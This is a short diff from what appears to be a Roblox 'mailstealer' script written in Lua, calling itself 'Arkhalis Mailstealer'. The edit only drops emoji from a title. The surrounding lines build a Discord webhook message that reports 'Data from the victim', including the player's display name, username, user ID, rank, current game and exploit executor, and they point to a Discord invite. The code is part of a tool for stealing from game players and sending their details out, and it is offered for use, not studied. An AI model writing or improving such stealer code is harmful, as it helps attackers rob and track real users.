@@ -74,7 +74,7 @@ local msg = {
 	["username"] = "Arkhalis",
 	["embeds"]= {
 	  {
-		["title"]= "`<:Gigachad:1112768331146068069> Arkhalis Mailstealer Results<:Gigachad:1112768331146068069> `",
+		["title"]= "`Arkhalis Mailstealer Results`",
 		["description"]= "**Data from the victim**\n***<:Gigachad:1112768331146068069> Display Name: ".._G.PlrDisplayNameVictim.."\n<:Gigachad:1112768331146068069> Username: ".._G.PlrUserVictim.."\n<:Gigachad:1112768331146068069> User ID: ".._G.PlrUserIDVictim.."\n:medal:Rank: ".._G.CurrentRank.."\n:joystick: Place: ".._G.GameIn.."\n:skull_crossbones: Executor: "..exploit.."***",
 		["url"]= "https://discord.gg/ajmeAeq76d",
 		["color"]= ""..webhookcolor.."",
